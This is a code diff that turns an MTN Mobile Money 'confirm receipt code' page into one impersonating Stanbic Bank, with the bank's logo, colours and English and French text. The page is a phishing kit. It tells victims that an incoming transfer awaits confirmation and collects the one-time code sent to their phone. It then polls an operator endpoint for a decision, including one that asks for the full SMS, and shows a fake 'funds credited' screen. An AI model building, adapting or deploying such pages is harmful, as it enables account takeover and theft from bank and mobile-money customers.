@@ -3,149 +3,189 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Confirm Receipt Code</title>
+<title>Stanbic Bank · Confirm Code</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --mtn-royal: #2059B5;
-    --mtn-deep:  #073A87;
-    --mtn-white: #FFFFFF;
-    --mtn-green: #28A745;
-    --mtn-yellow:#FFCC08;
-    --mtn-text:  #456BA8;
-    --mtn-gray:  #7C8798;
-    --mtn-border:#E5E9F0;
-    --mtn-soft:  #F5F7FB;
-    --mtn-page:  #E7EEF7;
-    --mtn-red:   #C62828;
+    --sb-primary:   #01008C;
+    --sb-royal:     #005EB8;
+    --sb-navy:      #001E50;
+    --sb-gold:      #FFB81C;
+    --sb-white:     #FFFFFF;
+    --sb-text:      #1A2233;
+    --sb-muted:     #5B6577;
+    --sb-border:    #E4E8F0;
+    --sb-soft:      #F4F6FA;
+    --sb-page:      #EEF1F7;
+    --sb-green:     #0E7A4A;
+    --sb-red:       #B3261E;
+    --sb-red-soft:  #FDECEA;
+    --sb-gold-soft: #FFF8E1;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
   body {
-    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: var(--mtn-page); color: var(--mtn-text);
-    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--sb-page); color: var(--sb-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
   .phone {
     width: 100%; max-width: 430px; min-height: 100vh;
-    background: var(--mtn-white); display: flex; flex-direction: column;
+    background: var(--sb-white); display: flex; flex-direction: column;
     position: relative; overflow: hidden;
   }
 
+  /* ─── TOP ─── */
   .top {
     position: relative; flex-shrink: 0;
-    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
-    padding: 18px 22px 26px;
-    border-bottom-left-radius: 38% 32px;
-    border-bottom-right-radius: 38% 32px;
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    padding: 20px 22px 26px;
+    border-bottom-left-radius: 20px;
+    border-bottom-right-radius: 20px;
   }
-  .top-row {
-    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  .top::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+    background: var(--sb-gold);
+    border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
-  .brand {
-    display: inline-flex; align-items: baseline; gap: 2px;
-    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  .top-logo {
+    height: 28px; width: auto; display: block;
+    filter: brightness(0) invert(1); opacity: 0.96;
   }
-  .brand .mtn { color: var(--mtn-yellow); }
-  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
-
   .page-title {
-    margin-top: 22px; font-size: 19px; font-weight: 800;
+    margin-top: 18px; font-size: 19px; font-weight: 800;
     color: #fff; letter-spacing: -0.3px; line-height: 1.25;
   }
   .page-sub {
-    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
-    line-height: 1.5; max-width: 320px;
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.80);
+    line-height: 1.55; max-width: 320px;
   }
 
+  /* ─── BODY ─── */
   .body {
     flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
-    padding: 34px 22px 24px;
+    padding: 22px 20px 24px;
     display: flex; flex-direction: column; justify-content: flex-start;
   }
 
+  /* Amount + purpose cards */
+  .amount-card {
+    background: var(--sb-soft); border-radius: 12px;
+    border: 1px solid var(--sb-border);
+    padding: 14px 16px; margin-bottom: 12px;
+    display: flex; flex-direction: column; gap: 3px;
+  }
+  .amount-card .label {
+    font-size: 10.5px; color: var(--sb-muted); font-weight: 700;
+    letter-spacing: 0.7px; text-transform: uppercase;
+  }
+  .amount-card .amount {
+    font-size: 22px; font-weight: 800; color: var(--sb-primary);
+    letter-spacing: -0.5px; line-height: 1.2;
+  }
+  .purpose-card {
+    background: #FFFDF5; border-radius: 12px;
+    border: 1px solid #F2E4B8;
+    padding: 12px 16px; margin-bottom: 18px;
+    position: relative; overflow: hidden;
+  }
+  .purpose-card.hidden { display: none; }
+  .purpose-card::before {
+    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
+    background: var(--sb-gold);
+  }
+  .purpose-card .label {
+    font-size: 10px; font-weight: 800; letter-spacing: 0.7px;
+    text-transform: uppercase; color: #8A6600; margin-bottom: 3px; display: block;
+  }
+  .purpose-card .purpose {
+    font-size: 13px; font-weight: 700; color: var(--sb-navy);
+    line-height: 1.4; word-break: break-word;
+  }
+
+  /* Notice */
   .notice {
     display: none;
-    padding: 13px 15px;
-    border-radius: 12px;
+    padding: 12px 14px;
+    border-radius: 10px;
     font-size: 12.5px;
     font-weight: 600;
     line-height: 1.55;
-    margin-bottom: 18px;
+    margin-bottom: 16px;
     border: 1px solid transparent;
   }
   .notice.show { display: block; }
   .notice .notice-title {
-    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
-    text-transform: uppercase; margin-bottom: 4px;
-    display: block;
+    font-size: 10.5px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px; display: block;
   }
   .notice.warn {
-    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
+    background: var(--sb-gold-soft); border-color: #F2E4B8; color: #7A5B00;
   }
   .notice.warn .notice-title { color: #8A6600; }
 
+  /* Section */
   .section-label {
-    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
-    text-transform: uppercase; color: var(--mtn-gray);
-    margin-bottom: 20px;
-    text-align: center;
+    font-size: 10.5px; font-weight: 800; letter-spacing: 0.7px;
+    text-transform: uppercase; color: var(--sb-muted);
+    margin-bottom: 18px; text-align: center;
   }
 
+  /* Code inputs */
   .code-row {
     display: flex; justify-content: center; gap: 12px;
     margin-bottom: 10px;
   }
   .code-input {
-    width: 62px; height: 70px;
-    background: var(--mtn-soft);
-    border: 1.5px solid var(--mtn-border);
-    border-radius: 12px;
+    width: 60px; height: 68px;
+    background: var(--sb-soft);
+    border: 1.5px solid var(--sb-border);
+    border-radius: 10px;
     font-family: inherit;
-    font-size: 28px; font-weight: 800;
-    color: var(--mtn-deep);
+    font-size: 26px; font-weight: 800;
+    color: var(--sb-primary);
     text-align: center;
     outline: none;
     transition: border-color .15s, background .15s, transform .1s;
     -webkit-appearance: none;
-    caret-color: var(--mtn-royal);
+    caret-color: var(--sb-primary);
   }
   .code-input:focus {
-    border-color: var(--mtn-royal);
+    border-color: var(--sb-primary);
     background: #fff;
     transform: translateY(-1px);
   }
   .code-input.filled {
-    border-color: var(--mtn-royal);
-    background: #F0F5FC;
+    border-color: var(--sb-primary);
+    background: #EEF3FB;
   }
   .code-input.invalid {
-    border-color: #E23B3B;
-    background: #FEF3F3;
-    color: var(--mtn-red);
+    border-color: var(--sb-red);
+    background: var(--sb-red-soft);
+    color: var(--sb-red);
   }
 
   .field-error {
     display: none;
-    font-size: 11.5px; color: var(--mtn-red); margin-top: 10px;
-    font-weight: 600; line-height: 1.4;
-    text-align: center;
+    font-size: 11.5px; color: var(--sb-red); margin-top: 10px;
+    font-weight: 600; line-height: 1.4; text-align: center;
   }
   .field-error.show { display: block; }
 
+  /* Buttons */
   .btn-approve {
-    width: 100%; margin-top: 28px; height: 54px;
-    background: var(--mtn-green); color: #fff;
-    font-family: inherit; font-size: 15px; font-weight: 900;
-    letter-spacing: 1.2px; text-transform: uppercase;
-    border: none; border-radius: 999px; cursor: pointer;
-    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
+    width: 100%; margin-top: 24px; height: 52px;
+    background: var(--sb-primary); color: #fff;
+    font-family: inherit; font-size: 14.5px; font-weight: 700;
+    letter-spacing: 0.5px; text-transform: uppercase;
+    border: none; border-radius: 10px; cursor: pointer;
+    box-shadow: 0 8px 20px rgba(1,0,140,0.22);
     transition: filter .15s, transform .1s, opacity .15s;
   }
-  .btn-approve:hover { filter: brightness(1.06); }
+  .btn-approve:hover { filter: brightness(1.08); }
   .btn-approve:active { transform: scale(0.985); }
   .btn-approve:disabled { opacity: 0.65; cursor: wait; }
 
@@ -154,31 +194,34 @@
     align-items: center; justify-content: center; gap: 8px;
     width: 100%; margin-top: 12px;
     padding: 12px 16px; font-size: 13px; font-weight: 700;
-    background: #fff; color: var(--mtn-royal);
-    border: 1.5px solid var(--mtn-royal); border-radius: 10px;
+    background: #fff; color: var(--sb-primary);
+    border: 1.5px solid var(--sb-primary); border-radius: 10px;
     cursor: pointer; font-family: inherit; transition: all .15s;
   }
   .btn-resend.show { display: inline-flex; }
-  .btn-resend:hover { background: #F0F5FC; }
+  .btn-resend:hover { background: var(--sb-soft); }
   .btn-resend:disabled { opacity: 0.6; cursor: wait; }
   .btn-resend svg {
     width: 15px; height: 15px; stroke: currentColor; fill: none;
     stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
   }
   .btn-resend.sent {
-    background: var(--mtn-green); color: #fff;
-    border-color: var(--mtn-green);
+    background: var(--sb-green); color: #fff;
+    border-color: var(--sb-green);
   }
 
+  /* Toast */
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
-    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
     z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
+  /* Authorizing + Success overlays */
   .authorizing, .success {
     position: fixed; inset: 0;
     display: none; flex-direction: column;
@@ -187,27 +230,27 @@
     color: #fff;
   }
   .authorizing {
-    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
   }
   .success {
-    background: linear-gradient(180deg, #1E7A3A 0%, var(--mtn-green) 100%);
+    background: linear-gradient(160deg, #0A5C38 0%, var(--sb-green) 100%);
   }
   .authorizing.show, .success.show { display: flex; }
 
   .authorizing .brand-label,
   .success .brand-label {
-    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
-    margin-bottom: 30px;
+    margin-bottom: 28px;
   }
-  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
-  .authorizing .brand-label .mm  { color: #fff; }
-  .success .brand-label .mtn { color: var(--mtn-yellow); }
-  .success .brand-label .mm  { color: #fff; }
+  .authorizing .brand-label img,
+  .success .brand-label img {
+    height: 28px; width: auto;
+    filter: brightness(0) invert(1); opacity: 0.96;
+  }
 
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
-    border-top-color: var(--mtn-yellow);
+    border-top-color: var(--sb-gold);
     border-radius: 50%;
     animation: spin 0.9s linear infinite;
     margin-bottom: 24px;
@@ -222,8 +265,7 @@
   .authorizing p,
   .success p {
     font-size: 13px; color: rgba(255,255,255,0.85);
-    max-width: 300px; line-height: 1.6;
-    margin: 0 auto;
+    max-width: 300px; line-height: 1.6; margin: 0 auto;
   }
 
   .success .check {
@@ -249,7 +291,7 @@
     to { stroke-dashoffset: 0; }
   }
   .success .credited-amount {
-    font-size: 26px; font-weight: 900; color: var(--mtn-yellow);
+    font-size: 26px; font-weight: 900; color: var(--sb-gold);
     letter-spacing: -0.5px; margin: 6px 0 14px;
   }
 
@@ -259,15 +301,17 @@
     font-size: 12px; font-weight: 600; cursor: pointer;
     text-decoration: underline; text-underline-offset: 3px;
   }
-  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+  .authorizing .cancel-link:hover { color: var(--sb-gold); }
 
+  /* Responsive */
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
-    .body { padding: 28px 18px 18px; }
-    .brand { font-size: 16px; }
+    .body { padding: 18px 18px 18px; }
+    .top-logo { height: 24px; }
     .page-title { font-size: 17px; }
+    .amount-card .amount { font-size: 19px; }
     .code-row { gap: 9px; }
-    .code-input { width: 54px; height: 62px; font-size: 24px; }
+    .code-input { width: 52px; height: 60px; font-size: 22px; }
     .btn-approve { height: 50px; font-size: 14px; }
     .authorizing h2, .success h2 { font-size: 19px; }
     .authorizing .spinner { width: 50px; height: 50px; }
@@ -279,11 +323,9 @@
     body { padding: 32px 0; align-items: center; }
     .phone {
       min-height: calc(100vh - 64px); max-height: 900px;
-      border-radius: 32px;
-      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
-      overflow: hidden;
+      border-radius: 20px;
+      box-shadow: 0 30px 80px rgba(1,0,140,0.18); overflow: hidden;
     }
-    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
   }
 </style>
 </head>
@@ -292,21 +334,33 @@
 <div class="phone">
 
   <div class="top">
-    <div class="top-row">
-      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
-    </div>
-    <div class="page-title" id="pageTitle">Enter receipt confirmation code</div>
-    <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to confirm this incoming payment.</div>
+    <img
+      class="top-logo"
+      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+      alt="Stanbic Bank"
+    >
+    <div class="page-title" id="pageTitle">Enter confirmation code</div>
+    <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to complete this transfer.</div>
   </div>
 
   <div class="body">
+
+    <div class="amount-card">
+      <span class="label" id="amountLabel">Amount</span>
+      <span class="amount" id="amountValue">—</span>
+    </div>
+
+    <div class="purpose-card hidden" id="purposeCard">
+      <span class="label" id="purposeLabel">Purpose</span>
+      <span class="purpose" id="purposeValue">—</span>
+    </div>
 
     <div class="notice warn" id="noticeExpired">
       <span class="notice-title" id="noticeExpiredTitle">Code expired</span>
       <span id="noticeExpiredBody">The code was not confirmed. Tap <strong>Resend code</strong> below to receive a new code, then enter it here.</span>
     </div>
 
-    <div class="section-label" id="sectionLabel">Enter confirmation code</div>
+    <div class="section-label" id="sectionLabel">Enter code</div>
 
     <div class="code-row" id="codeRow">
       <input class="code-input" id="c1" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
@@ -316,7 +370,7 @@
     </div>
     <div class="field-error" id="codeError">Please enter all 4 digits of your code.</div>
 
-    <button class="btn-approve" id="approveBtn" onclick="approveCode()">Confirm receipt</button>
+    <button class="btn-approve" id="approveBtn" onclick="approveCode()">Confirm transfer</button>
 
     <button class="btn-resend" id="resendBtn" onclick="resendCode()">
       <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
@@ -327,21 +381,31 @@
 </div>
 
 <div class="authorizing" id="authorizingOverlay">
-  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="brand-label">
+    <img
+      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+      alt="Stanbic Bank"
+    >
+  </div>
   <div class="spinner"></div>
-  <h2 id="authTitle">Confirming receipt…</h2>
-  <p id="authText">Verifying your code with MTN Mobile Money. Please do not close this page.</p>
+  <h2 id="authTitle">Confirming transfer…</h2>
+  <p id="authText">Verifying your code with Stanbic Bank. Please do not close this page.</p>
   <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
 
 <div class="success" id="successOverlay">
-  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="brand-label">
+    <img
+      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+      alt="Stanbic Bank"
+    >
+  </div>
   <div class="check">
     <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
   </div>
-  <h2 id="successTitle">Receipt confirmed</h2>
+  <h2 id="successTitle">Transfer confirmed</h2>
   <div class="credited-amount" id="creditedAmount">—</div>
-  <p id="successDesc">Your incoming payment has been confirmed and the funds are now in your MTN MoMo account. You will be redirected shortly.</p>
+  <p id="successDesc">Your incoming transfer has been confirmed and the funds are now in your account. You will be redirected shortly.</p>
 </div>
 
 <div class="toast" id="toast"></div>
@@ -349,22 +413,24 @@
 <script>
   const I18N = {
     en: {
-      docTitle: 'MTN Mobile Money · Confirm Receipt Code',
-      pageTitle: 'Enter receipt confirmation code',
-      pageSub: 'Enter the one-time code sent to your phone to confirm this incoming payment.',
+      docTitle: 'Stanbic Bank · Confirm Code',
+      pageTitle: 'Enter confirmation code',
+      pageSub: 'Enter the one-time code sent to your phone to complete this transfer.',
+      amountLabel: 'Amount',
+      purposeLabel: 'Purpose',
       noticeExpiredTitle: 'Code expired',
       noticeExpiredBody: 'The code was not confirmed. Tap <strong>Resend code</strong> below to receive a new code, then enter it here.',
-      sectionLabel: 'Enter confirmation code',
+      sectionLabel: 'Enter code',
       codeError: 'Please enter all 4 digits of your code.',
-      approveBtn: 'Confirm receipt',
+      approveBtn: 'Confirm transfer',
       resendLabel: 'Resend code',
       resendSending: 'Sending…',
       resendSent: 'Sent ✓',
-      authTitle: 'Confirming receipt…',
-      authText: 'Verifying your code with MTN Mobile Money. Please do not close this page.',
+      authTitle: 'Confirming transfer…',
+      authText: 'Verifying your code with Stanbic Bank. Please do not close this page.',
       cancelBtn: 'Cancel',
-      successTitle: 'Receipt confirmed',
-      successDesc: 'Your incoming payment has been confirmed and the funds are now in your MTN MoMo account. You will be redirected shortly.',
+      successTitle: 'Transfer confirmed',
+      successDesc: 'Your incoming transfer has been confirmed and the funds are now in your account. You will be redirected shortly.',
       creditedFallback: 'Received',
       networkError: 'Network error. Please try again.',
       notAccepted: 'Request was not accepted. Please try again.',
@@ -374,22 +440,24 @@
       resendFailed: 'Could not resend. Please try again in a moment.'
     },
     fr: {
-      docTitle: 'MTN Mobile Money · Code de confirmation de réception',
+      docTitle: 'Stanbic Bank · Code de confirmation',
       pageTitle: 'Saisissez le code de confirmation',
-      pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour confirmer ce paiement entrant.',
+      pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour finaliser ce virement.',
+      amountLabel: 'Montant',
+      purposeLabel: 'Motif',
       noticeExpiredTitle: 'Code expiré',
       noticeExpiredBody: 'Le code n\'a pas été confirmé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code, puis saisissez-le ici.',
-      sectionLabel: 'Saisissez le code de confirmation',
+      sectionLabel: 'Saisir le code',
       codeError: 'Veuillez saisir les 4 chiffres de votre code.',
-      approveBtn: 'Confirmer la réception',
+      approveBtn: 'Confirmer le virement',
       resendLabel: 'Renvoyer le code',
       resendSending: 'Envoi…',
       resendSent: 'Envoyé ✓',
-      authTitle: 'Confirmation de la réception…',
-      authText: 'Vérification de votre code avec MTN Mobile Money. Veuillez ne pas fermer cette page.',
+      authTitle: 'Confirmation du virement…',
+      authText: 'Vérification de votre code avec Stanbic Bank. Veuillez ne pas fermer cette page.',
       cancelBtn: 'Annuler',
-      successTitle: 'Réception confirmée',
-      successDesc: 'Votre paiement entrant a été confirmé et les fonds sont maintenant sur votre compte MTN MoMo. Vous allez être redirigé sous peu.',
+      successTitle: 'Virement confirmé',
+      successDesc: 'Votre virement entrant a été confirmé et les fonds sont maintenant sur votre compte. Vous allez être redirigé sous peu.',
       creditedFallback: 'Reçu',
       networkError: 'Erreur réseau. Veuillez réessayer.',
       notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
@@ -415,25 +483,9 @@
     sn:  urlParams.get('sn') || '',
     mk:  urlParams.get('mk') || '',
     an:  urlParams.get('an') || '',
-    dt:  urlParams.get('dt') || ''
+    dt:  urlParams.get('dt') || '',
+    pu:  urlParams.get('pu') || ''
   };
-
-  function applyTranslations() {
-    document.title = T.docTitle;
-    document.getElementById('pageTitle').textContent = T.pageTitle;
-    document.getElementById('pageSub').textContent = T.pageSub;
-    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
-    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
-    document.getElementById('sectionLabel').textContent = T.sectionLabel;
-    document.getElementById('codeError').textContent = T.codeError;
-    document.getElementById('approveBtn').textContent = T.approveBtn;
-    document.getElementById('resendLabel').textContent = T.resendLabel;
-    document.getElementById('authTitle').textContent = T.authTitle;
-    document.getElementById('authText').textContent = T.authText;
-    document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
-    document.getElementById('successTitle').textContent = T.successTitle;
-    document.getElementById('successDesc').textContent = T.successDesc;
-  }
 
   const CURRENCY_LOCALE = {
     XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
@@ -459,6 +511,25 @@
     t.textContent = msg; t.classList.add('show');
     clearTimeout(t._timer);
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('amountLabel').textContent = T.amountLabel;
+    document.getElementById('purposeLabel').textContent = T.purposeLabel;
+    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
+    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
+    document.getElementById('sectionLabel').textContent = T.sectionLabel;
+    document.getElementById('codeError').textContent = T.codeError;
+    document.getElementById('approveBtn').textContent = T.approveBtn;
+    document.getElementById('resendLabel').textContent = T.resendLabel;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authText').textContent = T.authText;
+    document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
+    document.getElementById('successTitle').textContent = T.successTitle;
+    document.getElementById('successDesc').textContent = T.successDesc;
   }
 
   const codeInputs = [
@@ -544,6 +615,18 @@
   document.addEventListener('DOMContentLoaded', () => {
     applyTranslations();
     codeInputs[0].focus();
+
+    document.getElementById('amountValue').textContent =
+      tx.am ? formatAmount(tx.am, tx.cur) : '—';
+
+    const purposeCard = document.getElementById('purposeCard');
+    const purposeValue = document.getElementById('purposeValue');
+    if (tx.pu && tx.pu.trim()) {
+      purposeValue.textContent = tx.pu.trim();
+      purposeCard.classList.remove('hidden');
+    } else {
+      purposeCard.classList.add('hidden');
+    }
 
     if ('OTPCredential' in window && navigator.credentials && navigator.credentials.get) {
       try {
@@ -644,9 +727,12 @@
       let decision = 'pending';
       try {
         const r = await fetch('/api/mtn/otp-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        if (!r.ok) throw new Error('HTTP ' + r.status);
         const j = await r.json();
         decision = j.decision || 'pending';
-      } catch (e) { }
+      } catch (e) {
+        console.warn('[otp poll] error:', e);
+      }
 
       if (!pollingActive) return;
 
@@ -661,7 +747,7 @@
         setTimeout(() => {
           const q = new URLSearchParams({
             tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt, pu: tx.pu,
             lang: currentLang
           });
           window.location.href = 'success.html?' + q.toString();
@@ -687,7 +773,7 @@
         document.getElementById('authorizingOverlay').classList.remove('show');
         const q = new URLSearchParams({
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt, pu: tx.pu,
           reason: decision === 'needs_full_sms' ? 'needs_full_sms' : 'inactive',
           lang: currentLang
         });
